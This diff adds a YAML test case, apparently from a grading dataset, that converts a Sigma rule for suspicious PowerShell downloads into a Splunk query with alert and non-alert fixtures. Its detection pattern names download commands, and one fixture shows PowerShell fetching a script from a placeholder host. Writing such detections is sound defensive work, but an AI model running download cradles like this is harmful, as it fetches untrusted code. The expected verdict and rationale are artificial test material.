@@ -1,0 +1,26 @@
+id: sigma-conversion-with-regression-fixtures
+kind: benign
+summary: Converted rule keeps explicit field mapping and alert/non-alert fixtures.
+platform: splunk
+source_rule: suspicious-powershell-download
+field_mapping:
+  Image: process_name
+  CommandLine: process_command_line
+  User: user
+converted_query: |
+  index=edr sourcetype=process
+  (process_name="powershell.exe" OR process_name="pwsh.exe")
+  ("Invoke-WebRequest" OR "DownloadString" OR "iwr ")
+  | table _time, host, user, process_name, process_command_line
+fixtures:
+  should_alert:
+    process_name: powershell.exe
+    process_command_line: powershell.exe -NoP -c "iwr http://example.test/a.ps1"
+  should_not_alert:
+    process_name: powershell.exe
+    process_command_line: powershell.exe -Command "Get-Process"
+expected_result: should_not_flag_conversion
+safe_because:
+  - source-to-target field mapping is documented
+  - positive and benign fixtures are listed beside the converted query
+  - expected alert behavior is explicit after conversion
